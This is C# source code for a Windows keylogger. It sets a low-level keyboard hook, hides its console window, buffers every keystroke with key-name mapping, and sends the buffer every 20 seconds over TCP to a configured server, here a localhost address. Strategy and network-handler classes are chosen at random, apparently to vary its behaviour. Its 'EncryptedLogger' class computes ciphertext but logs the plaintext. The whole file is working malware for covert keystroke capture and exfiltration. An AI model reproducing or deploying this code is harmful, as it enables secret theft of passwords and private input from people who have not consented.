using Delta;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using static Delta.KeyMapper;
using static Delta.NativeMethods;
using static System.Net.Mime.MediaTypeNames;

namespace Delta
{
    public static class NativeMethods
    {
        public const int WH_KEYBOARD_LL = 13;
        public const int WM_KEYDOWN = 0x0100;
        public const int VK_SHIFT = 0x10;
        public const int VK_CAPITAL = 0x14;
        public const int VK_NUMLOCK = 0x90;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll")]
        public static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

        [DllImport("user32.dll")]
        public static extern bool TranslateMessage([In] ref MSG lpMsg);

        [DllImport("user32.dll")]
        public static extern IntPtr DispatchMessage([In] ref MSG lpMsg);

        [StructLayout(LayoutKind.Sequential)]
        public struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public POINT pt;
            public uint lPrivate;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int x;
            public int y;
        }

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    }

    public interface IKeyMappingStrategy
    {
        NativeMethods.LowLevelKeyboardProc GetCallback();
    }

    public static class KeyMapper
    {
        public static string GetKeyName(int vkCode, bool isShiftPressed, bool isCapsLockOn, bool isNumLockOn)
        {
            switch (vkCode)
            {
                case 8: return "<BACKSPACE>";
                case 9: return "<TAB>";
                case 13: return "<RETURN>";
                case 16: return "<SHIFT>";
                case 17: return "<CONTROL>";
                case 18: return "<ALT>";
                case 19: return "<PAUSE>";
                case 20: return "<CAPSLOCK>";
                case 27: return "<ESCAPE>";
                case 32: return " ";
                case 33: return "<PAGEUP>";
                case 34: return "<PAGEDOWN>";
                case 35: return "<END>";
                case 36: return "<HOME>";
                case 37: return "<LEFT>";
                case 38: return "<UP>";
                case 39: return "<RIGHT>";
                case 40: return "<DOWN>";
                case 44: return "<PRTSC>";
                case 45: return "<INSERT>";
                case 46: return "<DELETE>";
                case 91: return "<LWIN>";
                case 92: return "<RWIN>";
                case 93: return "<APPS>";
                case 96: return isNumLockOn ? "0" : "<INSERT>";
                case 97: return isNumLockOn ? "1" : "<END>";
                case 98: return isNumLockOn ? "2" : "<DOWN>";
                case 99: return isNumLockOn ? "3" : "<PAGEDOWN>";
                case 100: return isNumLockOn ? "4" : "<LEFT>";
                case 101: return isNumLockOn ? "5" : "5";
                case 102: return isNumLockOn ? "6" : "<RIGHT>";
                case 103: return isNumLockOn ? "7" : "<HOME>";
                case 104: return isNumLockOn ? "8" : "<UP>";
                case 105: return isNumLockOn ? "9" : "<PAGEUP>";
                case 106: return "*";
                case 107: return "+";
                case 109: return "-";
                case 110: return ".";
                case 111: return "/";
                case 144: return "<NUMLOCK>";
                case 145: return "<SCROLLLOCK>";
                case 160:
                case 161: return "<SHIFT>";
                case 162:
                case 163: return "<CONTROL>";
                case 164: return "<LALT>";
                case 165: return "<RALT>";
                case 166: return "<BROWSER_BACK>";
                case 167: return "<BROWSER_FORWARD>";
                case 168: return "<BROWSER_REFRESH>";
                case 169: return "<BROWSER_STOP>";
                case 170: return "<BROWSER_SEARCH>";
                case 171: return "<BROWSER_FAVORITES>";
                case 172: return "<BROWSER_HOME>";
                case 173: return "<VOLUME_MUTE>";
                case 174: return "<VOLUME_DOWN>";
                case 175: return "<VOLUME_UP>";
                case 176: return "<MEDIA_NEXT_TRACK>";
                case 177: return "<MEDIA_PREV_TRACK>";
                case 178: return "<MEDIA_STOP>";
                case 179: return "<MEDIA_PLAY_PAUSE>";
                case 180: return "<LAUNCH_MAIL>";
                case 181: return "<LAUNCH_MEDIA_SELECT>";
                case 182: return "<LAUNCH_APP1>";
                case 183: return "<LAUNCH_APP2>";
                case 186: return ";";
                case 187: return "=";
                case 188: return ",";
                case 189: return "-";
                case 190: return ".";
                case 191: return "/";
                case 192: return "`";
                case 219: return "[";
                case 220: return "\\";
                case 221: return "]";
                case 222: return "'";
                case 112: return "<F1>";
                case 113: return "<F2>";
                case 114: return "<F3>";
                case 115: return "<F4>";
                case 116: return "<F5>";
                case 117: return "<F6>";
                case 118: return "<F7>";
                case 119: return "<F8>";
                case 120: return "<F9>";
                case 121: return "<F10>";
                case 122: return "<F11>";
                case 123: return "<F12>";
                case 124: return "<F13>";
                case 125: return "<F14>";
                case 126: return "<F15>";
                case 127: return "<F16>";
                case 128: return "<F17>";
                case 129: return "<F18>";
                case 130: return "<F19>";
                case 131: return "<F20>";
                case 132: return "<F21>";
                case 133: return "<F22>";
                case 134: return "<F23>";
                case 135: return "<F24>";
                default:
                    if (vkCode >= 48 && vkCode <= 57)
                    {
                        if (isShiftPressed)
                        {
                            switch (vkCode)
                            {
                                case 48: return ")";
                                case 49: return "!";
                                case 50: return "@";
                                case 51: return "#";
                                case 52: return "$";
                                case 53: return "%";
                                case 54: return "^";
                                case 55: return "&";
                                case 56: return "*";
                                case 57: return "(";
                                default: return ((char)vkCode).ToString();
                            };
                        }
                        else
                        {
                            return ((char)vkCode).ToString();
                        }
                    }
                    else if (vkCode >= 65 && vkCode <= 90)
                    {
                        if (isShiftPressed ^ isCapsLockOn)
                        {
                            return ((char)vkCode).ToString().ToUpper();
                        }
                        else
                        {
                            return ((char)vkCode).ToString().ToLower();
                        }
                    }
                    else
                    {
                        return $"<{vkCode}>";
                    }
            }
        }
    }

    public class KeyMappingStrategyA : IKeyMappingStrategy
    {
        private readonly StringBuilder _keyBuffer;
        private readonly IntPtr _hookId;
        private readonly ILogger _logger;

        public KeyMappingStrategyA(StringBuilder keyBuffer, IntPtr hookId, ILogger logger)
        {
            _keyBuffer = keyBuffer;
            _hookId = hookId;
            _logger = logger;
        }
        public NativeMethods.LowLevelKeyboardProc GetCallback()
        {
            return HookCallback;
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode < 0 || wParam != (IntPtr)NativeMethods.WM_KEYDOWN)
            {
                return NativeMethods.CallNextHookEx(_hookId, nCode, wParam, lParam);
            }
            int vkCode = Marshal.ReadInt32(lParam);
            bool isShiftPressed = (NativeMethods.GetKeyState(NativeMethods.VK_SHIFT) & 0x8000) != 0;
            bool isCapsLockOn = (NativeMethods.GetKeyState(NativeMethods.VK_CAPITAL) & 0x0001) != 0;
            bool isNumLockOn = (NativeMethods.GetKeyState(NativeMethods.VK_NUMLOCK) & 0x0001) != 0;

            string keyName = KeyMapper.GetKeyName(vkCode, isShiftPressed, isCapsLockOn, isNumLockOn);           
            
            _keyBuffer.Append(keyName);
            _logger.Log($"1. Appending '{keyName}' to keybuffer");
            return NativeMethods.CallNextHookEx(_hookId, nCode, wParam, lParam);
        }
    }

    public class KeyMappingStrategyB : IKeyMappingStrategy
    {
        private readonly StringBuilder _keyBuffer;
        private readonly IntPtr _hookId;
        private readonly ILogger _logger;

        public KeyMappingStrategyB(StringBuilder keyBuffer, IntPtr hookId, ILogger logger)
        {
            _keyBuffer = keyBuffer;
            _hookId = hookId;
            _logger = logger;
        }
        public NativeMethods.LowLevelKeyboardProc GetCallback()
        {
            return HookCallback;
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode < 0 || wParam != (IntPtr)NativeMethods.WM_KEYDOWN)
            {
                return NativeMethods.CallNextHookEx(_hookId, nCode, wParam, lParam);
            }
            int vkCode = Marshal.ReadInt32(lParam);
            bool isShiftPressed = (NativeMethods.GetKeyState(NativeMethods.VK_SHIFT) & 0x8000) != 0;
            bool isCapsLockOn = (NativeMethods.GetKeyState(NativeMethods.VK_CAPITAL) & 0x0001) != 0;
            bool isNumLockOn = (NativeMethods.GetKeyState(NativeMethods.VK_NUMLOCK) & 0x0001) != 0;

            string keyName = KeyMapper.GetKeyName(vkCode, isShiftPressed, isCapsLockOn, isNumLockOn);

            _keyBuffer.Append(keyName);
            _logger.Log($"2. Appending '{keyName}' to keybuffer");
            return NativeMethods.CallNextHookEx(_hookId, nCode, wParam, lParam);
        }
    }

    public interface IKeyMappingStrategyFactory
    {
        IKeyMappingStrategy CreateStrategy(StringBuilder keyBuffer, IntPtr hookId, ILogger logger);
    }

    public class KeyMappingStrategyFactoryA : IKeyMappingStrategyFactory
    {
        public IKeyMappingStrategy CreateStrategy(StringBuilder keyBuffer, IntPtr hookId, ILogger logger)
        {
            return new KeyMappingStrategyA(keyBuffer, hookId, logger);
        }
    }

    public class KeyMappingStrategyFactoryB : IKeyMappingStrategyFactory
    {
        public IKeyMappingStrategy CreateStrategy(StringBuilder keyBuffer, IntPtr hookId, ILogger logger)
        {
            return new KeyMappingStrategyB(keyBuffer, hookId, logger);
        }
    }

    public interface INetworkHandler
    {
        void SendData(string data);
    }

    public interface INetworkHandlerFactory
    {
        INetworkHandler CreateNetworkHandler();
    }

    public class TcpNetworkHandler : INetworkHandler
    {
        private readonly string _serverIp;
        private readonly int _serverPort;
        private readonly ILogger _logger;

        public TcpNetworkHandler(string serverIp, int serverPort, ILogger logger)
        {
            _serverIp = serverIp;
            _serverPort = serverPort;
            _logger = logger;
        }

        public void SendData(string data)
        {
            try
            {
                _logger.Log($"Trying to send data to server using TCP connection...  Server IP: {_serverIp}, Server Port: {_serverPort}");
                using (TcpClient client = new TcpClient(_serverIp, _serverPort))
                {
                    NetworkStream stream = client.GetStream();
                    byte[] bytes = Encoding.UTF8.GetBytes(data);
                    stream.Write(bytes, 0, bytes.Length);
                    _logger.Log($"Sent data to server: {data}");
                }
            }
            catch (Exception ex)
            {
                _logger.Log($"Error in TcpNetworkHandler: {ex.Message}");
            }
        }
    }

    public class HttpNetworkHandler : INetworkHandler
    {
        private readonly string _serverUrl;
        private readonly int _serverPort;
        private readonly ILogger _logger;

        public HttpNetworkHandler(string serverUrl, int serverPort, ILogger logger)
        {
            _serverUrl = serverUrl;
            _logger = logger;
            _serverPort = serverPort;
        }

        public void SendData(string data)
        {
            try
            {
                _logger.Log($"Trying to send data to server using HTTP POST request...  Server URL: {_serverUrl}");
                using (TcpClient client = new TcpClient(_serverUrl, _serverPort))
                {
                    NetworkStream stream = client.GetStream();
                    byte[] bytes = Encoding.UTF8.GetBytes(data);
                    stream.Write(bytes, 0, bytes.Length);
                    _logger.Log($"Sent data to server: {data}");
                }
            }
            catch (Exception ex)
            {
                _logger.Log($"Error in HttpNetworkHandler: {ex.Message}");
            }
        }
    }

    public class TcpNetworkHandlerFactory : INetworkHandlerFactory
    {
        private readonly string _serverIp;
        private readonly int _serverPort;
        private readonly ILogger _logger;

        public TcpNetworkHandlerFactory(string serverIp, int serverPort, ILogger logger)
        {
            _serverIp = serverIp;
            _serverPort = serverPort;
            _logger = logger;
        }

        public INetworkHandler CreateNetworkHandler()
        {
            return new TcpNetworkHandler(_serverIp, _serverPort, _logger);
        }
    }

    public class HttpNetworkHandlerFactory : INetworkHandlerFactory
    {
        private readonly string _serverUrl;
        private readonly int _serverPort;
        private readonly ILogger _logger;

        public HttpNetworkHandlerFactory(string serverUrl, int serverPort, ILogger logger)
        {
            _serverUrl = serverUrl;
            _serverPort = serverPort;
            _logger = logger;
        }

        public INetworkHandler CreateNetworkHandler()
        {
            return new HttpNetworkHandler(_serverUrl, _serverPort, _logger);
        }
    }

    public interface IKeyBufferObserver
    {
        void OnKeyBufferUpdated(string newKey);
    }

    public class ObservableKeyMappingStrategyA : IKeyMappingStrategy
    {
        private readonly StringBuilder _keyBuffer;
        private readonly IntPtr _hookId;
        private readonly ILogger _logger;
        private readonly List<IKeyBufferObserver> _observers = new List<IKeyBufferObserver>();

        public ObservableKeyMappingStrategyA(StringBuilder keyBuffer, IntPtr hookId, ILogger logger)
        {
            _keyBuffer = keyBuffer;
            _hookId = hookId;
            _logger = logger;
        }

        public void RegisterObserver(IKeyBufferObserver observer)
        {
            _observers.Add(observer);
        }

        public void UnregisterObserver(IKeyBufferObserver observer)
        {
            _observers.Remove(observer);
        }

        public NativeMethods.LowLevelKeyboardProc GetCallback()
        {
            return HookCallback;
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode < 0 || wParam != (IntPtr)NativeMethods.WM_KEYDOWN)
            {
                return NativeMethods.CallNextHookEx(_hookId, nCode, wParam, lParam);
            }
            int vkCode = Marshal.ReadInt32(lParam);
            bool isShiftPressed = (NativeMethods.GetKeyState(NativeMethods.VK_SHIFT) & 0x8000) != 0;
            bool isCapsLockOn = (NativeMethods.GetKeyState(NativeMethods.VK_CAPITAL) & 0x0001) != 0;
            bool isNumLockOn = (NativeMethods.GetKeyState(NativeMethods.VK_NUMLOCK) & 0x0001) != 0;

            string keyName = KeyMapper.GetKeyName(vkCode, isShiftPressed, isCapsLockOn, isNumLockOn);

            _keyBuffer.Append(keyName);
            NotifyObservers(keyName);
            _logger.Log($"Appending '{keyName}' to keybuffer");
            return NativeMethods.CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private void NotifyObservers(string newKey)
        {
            foreach (var observer in _observers)
            {
                observer.OnKeyBufferUpdated(newKey);
            }
        }
    }

    public class KeyBufferObserver : IKeyBufferObserver
    {
        private readonly ILogger _logger;

        public KeyBufferObserver(ILogger logger)
        {
            _logger = logger;
        }

        public void OnKeyBufferUpdated(string newKey)
        {
            _logger.Log($"Observer notified: New key appended -> {newKey}");
        }
    }


    public interface ILogger
    {
        void Log(string message);
    }

    public class ConsoleLogger : ILogger
    {
        public void Log(string message)
        {
            Console.WriteLine($"{DateTime.Now}: {message}");
        }
    }

    public class EncryptedLogger : ILogger
    {
        private readonly ILogger _innerLogger;
        private readonly byte[] _key;
        private readonly byte[] _iv;

        public EncryptedLogger(ILogger innerLogger, byte[] key, byte[] iv)
        {
            _innerLogger = innerLogger;
            _key = key;
            _iv = iv;
        }

        public void Log(string message)
        {
            string encryptedMessage = Encrypt(message, _key, _iv);
            _innerLogger.Log(message);
        }

        private string Encrypt(string plainText, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        using (StreamWriter sw = new StreamWriter(cs))
                        {
                            sw.Write(plainText);
                        }
                    }
                    return Convert.ToBase64String(ms.ToArray());
                }
            }
        }
    }

    class Program
    {
        private static readonly StringBuilder _keyBuffer = new StringBuilder();
        private static System.Timers.Timer _timer;
        private static IntPtr _hookId = IntPtr.Zero;
        private static readonly string _serverIp = "127.0.0.1";
        private static readonly int _serverPort = 10000;
        private static readonly string _serverUrl = "http://localhost:5000";
        private static readonly int _interval = 20000;
        private static INetworkHandler _networkHandler;
        private static ILogger _logger;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;


        [STAThread]
        static void Main(string[] args)
        {
            byte[] encryptionKey = Encoding.UTF8.GetBytes("58d4flm2e1oe4tm9");
            byte[] encryptionIv = Encoding.UTF8.GetBytes("dr2et6o8l611acv6");

            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            var notifyIcon = new NotifyIcon()
            {
                Visible = false
            };

            _logger = new EncryptedLogger(new ConsoleLogger(), encryptionKey, encryptionIv);
            _networkHandler = InitializeNetworkHandler();

            IKeyMappingStrategy strategy = InitializeKeyMappingStrategy();
            Process currentProcess = Process.GetCurrentProcess();
            IntPtr moduleHandle = NativeMethods.GetModuleHandle(currentProcess.MainModule.ModuleName);
            _hookId = NativeMethods.SetWindowsHookEx(NativeMethods.WH_KEYBOARD_LL, strategy.GetCallback(), moduleHandle, 0);

            if (_hookId == IntPtr.Zero)
            {
                _logger.Log("Failed to set hook.");
                return;
            }

            _timer = new System.Timers.Timer(_interval);
            _timer.Elapsed += SendKeysToServer;
            _timer.Start();

            Console.WriteLine(_serverIp);
            Console.WriteLine(_serverPort);
            Console.WriteLine(_interval);
            HandleMessage();

            NativeMethods.UnhookWindowsHookEx(_hookId);
        }

        private static IKeyMappingStrategy InitializeKeyMappingStrategy()
        {
            Random random = new Random();
            int strategyChoice = random.Next(0, 2);

            IKeyMappingStrategyFactory factory;
            if (strategyChoice == 0)
            {
                factory = new KeyMappingStrategyFactoryA();
            }
            else
            {
                factory = new KeyMappingStrategyFactoryB();
            }
            return factory.CreateStrategy(_keyBuffer, _hookId, _logger);
        }

        private static IKeyMappingStrategy InitializeStrategies()
        {
            Random random = new Random();
            int strategyChoice = random.Next(0, 2);

            if (strategyChoice == 0)
            {
                return new KeyMappingStrategyA(_keyBuffer, _hookId, _logger);
            }
            else
            { 
                return new KeyMappingStrategyB(_keyBuffer, _hookId, _logger);
            }
        }

        private static INetworkHandler InitializeNetworkHandler()
        {
            Random random = new Random();
            int handlerChoice = random.Next(0, 2);

            INetworkHandlerFactory factory;
            if (handlerChoice == 0)
            {
                factory = new TcpNetworkHandlerFactory(_serverIp, _serverPort, _logger);
            }
            else
            {
                factory = new HttpNetworkHandlerFactory(_serverUrl, _serverPort, _logger);
            }
            return factory.CreateNetworkHandler();
        }

        static void HandleMessage()
        {
            MSG msg;
            while (NativeMethods.GetMessage(out msg, IntPtr.Zero, 0, 0))
            {
                NativeMethods.TranslateMessage(ref msg);
                NativeMethods.DispatchMessage(ref msg);
            }
        }

        private static void SendKeysToServer(object sender, ElapsedEventArgs e)
        {
            if (_keyBuffer.Length < 1)
            {
                Console.WriteLine("keybuffer < 1");
                return;
            }
            try
            {
                _networkHandler.SendData(_keyBuffer.ToString());
                _keyBuffer.Clear();
            }
            catch (Exception ex)
            {
                _logger.Log($"Error sending keys to server: {ex.Message}");
            }
        }
    }
}
